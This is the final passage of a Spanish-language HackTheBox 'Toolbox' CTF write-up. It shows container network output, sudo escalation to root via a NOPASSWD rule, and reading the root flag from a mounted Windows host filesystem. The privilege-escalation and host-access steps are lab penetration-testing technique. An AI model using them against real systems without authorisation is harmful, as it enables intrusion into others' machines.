+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>    inet6 fe80::a00:27ff:fe2c:6d87/64 scope link 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>4: sit0@NONE: &lt;NOARP&gt; mtu <span style="color:#ff0;font-weight:bold">1480</span> qdisc noop state DOWN group default qlen <span style="color:#ff0;font-weight:bold">1000</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>    link/sit 0.0.0.0 brd 0.0.0.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>5: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ff0;font-weight:bold">1500</span> qdisc noqueue state UP group default 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>    link/ether 02:42:45:ec:6e:91 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>    inet6 fe80::42:45ff:feec:6e91/64 scope link 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>7: veth6cda6c0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ff0;font-weight:bold">1500</span> qdisc noqueue master docker0 state UP group default 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>    link/ether 6a:bf:73:37:1b:6d brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>    inet6 fe80::68bf:73ff:fe37:1b6d/64 scope link 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>       valid_lft forever preferred_lft forever</span></span></code></pre></div>
+<p>Y ganamos acceso a otro contenedor.</p>
+<p>Tenemos permiso para ejecutar cualquier usuario como <code>root</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>docker@box:~$ sudo -l                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>User docker may run the following commands on this host:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>    (root) NOPASSWD: ALL
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>docker@box:~$ sudo su                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>root@box:/home/docker#</span></span></code></pre></div>
+<p>Enumerando el sistema encontramos un directorio <code>c</code> en la raíz del sistema.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>root@box:/# ls -la                                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>total <span style="color:#ff0;font-weight:bold">244</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>drwxr-xr-x   <span style="color:#ff0;font-weight:bold">17</span> root     root           <span style="color:#ff0;font-weight:bold">440</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:05 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>drwxr-xr-x   <span style="color:#ff0;font-weight:bold">17</span> root     root           <span style="color:#ff0;font-weight:bold">440</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:05 ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>drwxr-xr-x    <span style="color:#ff0;font-weight:bold">2</span> root     root          <span style="color:#ff0;font-weight:bold">1420</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:03 bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>drwxr-xr-x    <span style="color:#ff0;font-weight:bold">3</span> root     root            <span style="color:#ff0;font-weight:bold">60</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:05 c
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>drwxrwxr-x   <span style="color:#ff0;font-weight:bold">14</span> root     staff         <span style="color:#ff0;font-weight:bold">4340</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:03 dev
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>drwxr-xr-x    <span style="color:#ff0;font-weight:bold">9</span> root     root          <span style="color:#ff0;font-weight:bold">1000</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:05 etc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>drwxrwxr-x    <span style="color:#ff0;font-weight:bold">4</span> root     staff           <span style="color:#ff0;font-weight:bold">80</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:03 home
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>-rwxr-xr-x    <span style="color:#ff0;font-weight:bold">1</span> root     root           <span style="color:#ff0;font-weight:bold">496</span> Oct <span style="color:#ff0;font-weight:bold">19</span>  <span style="color:#ff0;font-weight:bold">2019</span> init
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>drwxr-xr-x    <span style="color:#ff0;font-weight:bold">4</span> root     root           <span style="color:#ff0;font-weight:bold">800</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:02 lib
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>lrwxrwxrwx    <span style="color:#ff0;font-weight:bold">1</span> root     root             <span style="color:#ff0;font-weight:bold">3</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:02 lib64 -&gt; lib
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>lrwxrwxrwx    <span style="color:#ff0;font-weight:bold">1</span> root     root            <span style="color:#ff0;font-weight:bold">11</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:02 linuxrc -&gt; bin/busybox
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>drwxr-xr-x    <span style="color:#ff0;font-weight:bold">4</span> root     root            <span style="color:#ff0;font-weight:bold">80</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:02 mnt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>drwxrwsr-x    <span style="color:#ff0;font-weight:bold">3</span> root     staff          <span style="color:#ff0;font-weight:bold">180</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:05 opt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>dr-xr-xr-x  <span style="color:#ff0;font-weight:bold">163</span> root     root             <span style="color:#ff0;font-weight:bold">0</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:02 proc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>drwxrwxr-x    <span style="color:#ff0;font-weight:bold">2</span> root     staff           <span style="color:#ff0;font-weight:bold">80</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:03 root
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>drwxrwxr-x    <span style="color:#ff0;font-weight:bold">6</span> root     staff          <span style="color:#ff0;font-weight:bold">140</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:05 run
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>drwxr-xr-x    <span style="color:#ff0;font-weight:bold">2</span> root     root          <span style="color:#ff0;font-weight:bold">1300</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:03 sbin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>-rw-r--r--    <span style="color:#ff0;font-weight:bold">1</span> root     root        <span style="color:#ff0;font-weight:bold">241842</span> Oct <span style="color:#ff0;font-weight:bold">19</span>  <span style="color:#ff0;font-weight:bold">2019</span> squashfs.tgz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>dr-xr-xr-x   <span style="color:#ff0;font-weight:bold">13</span> root     root             <span style="color:#ff0;font-weight:bold">0</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:03 sys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>lrwxrwxrwx    <span style="color:#ff0;font-weight:bold">1</span> root     root            <span style="color:#ff0;font-weight:bold">13</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:02 tmp -&gt; /mnt/sda1/tmp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>drwxr-xr-x    <span style="color:#ff0;font-weight:bold">7</span> root     root           <span style="color:#ff0;font-weight:bold">140</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:03 usr
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>drwxrwxr-x    <span style="color:#ff0;font-weight:bold">8</span> root     staff          <span style="color:#ff0;font-weight:bold">180</span> Aug <span style="color:#ff0;font-weight:bold">24</span> 18:03 var</span></span></code></pre></div>
+<p>Y esto parece un sistema de ficheros de Windows&hellip;</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>root@box:/c/Users# ls                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Administrator  Default        Public         desktop.ini
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>All Users      Default User   Tony</span></span></code></pre></div>
+<p>Y como tenemos acceso a todo el sistema de ficheros sin restricciones porque en el contenedor somo <code>root</code> podemos leer la flag de <code>root</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>root@box:/c/Users/Administrator/Desktop# cat root.txt                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>cc9a0b76ac17f8f...</span></span></code></pre></div>
+<p>¡Y ya estaría!</p>
+<p>Happy Hacking! 🚀</p>
+
+  </content>
+  <p>
+    
+      <a href="/tags/hackthebox/">#HackTheBox</a>&nbsp;&nbsp;
+    
+      <a href="/tags/toolbox/">#Toolbox</a>&nbsp;&nbsp;
+    
+      <a href="/tags/writeup/">#Writeup</a>&nbsp;&nbsp;
+    
+      <a href="/tags/cybersecurity/">#Cybersecurity</a>&nbsp;&nbsp;
+    
+      <a href="/tags/penetration-testing/">#Penetration Testing</a>&nbsp;&nbsp;
+    
+      <a href="/tags/ctf/">#CTF</a>&nbsp;&nbsp;
+    
+      <a href="/tags/reverse-shell/">#Reverse Shell</a>&nbsp;&nbsp;
+    
+      <a href="/tags/privilege-escalation/">#Privilege Escalation</a>&nbsp;&nbsp;
+    
+      <a href="/tags/rce/">#RCE</a>&nbsp;&nbsp;
+    
+      <a href="/tags/exploit/">#Exploit</a>&nbsp;&nbsp;
+    
+      <a href="/tags/linux/">#Linux</a>&nbsp;&nbsp;
+    
+      <a href="/tags/windows/">#Windows</a>&nbsp;&nbsp;
+    
+      <a href="/tags/container-pivoting/">#Container Pivoting</a>&nbsp;&nbsp;
+    
+      <a href="/tags/docker-breakout/">#Docker Breakout</a>&nbsp;&nbsp;
+    
+      <a href="/tags/docker/">#Docker</a>&nbsp;&nbsp;
+    
+      <a href="/tags/sqli/">#SQLi</a>&nbsp;&nbsp;
+    
+      <a href="/tags/sql-injection/">#SQL Injection</a>&nbsp;&nbsp;
+    
+      <a href="/tags/authentication-bypass/">#Authentication Bypass</a>&nbsp;&nbsp;
+    
+      <a href="/tags/http-enumeration/">#HTTP Enumeration</a>&nbsp;&nbsp;
+    
+  </p>
+
+    </main>
+    <footer>
+      
+  <span>© 2024 pointedsec</span>
+
+
+
+    </footer>
+
+    
+</body>
+</html>
